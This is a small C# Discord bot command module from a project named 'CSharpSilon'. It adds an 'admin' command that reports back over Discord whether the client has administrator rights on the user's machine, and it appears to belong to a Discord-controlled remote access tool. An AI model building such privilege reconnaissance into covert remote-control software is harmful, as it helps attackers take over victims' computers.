using System.Threading.Tasks;
using Discord.Commands;

namespace CSharpSilon.cmds
{
    public class App : ModuleBase<SocketCommandContext>
    {
        [Command("admin"), Summary("A Command To See If The Client Has Admin Privledges On The User's Machine")]
        public async Task Admin()
        {
            await ReplyAsync($"I Currently: {(Utils.App.IsAdmin() ? "Do" : "Do Not")} Have Admin Permissions").ConfigureAwait(false);
        }
    }
}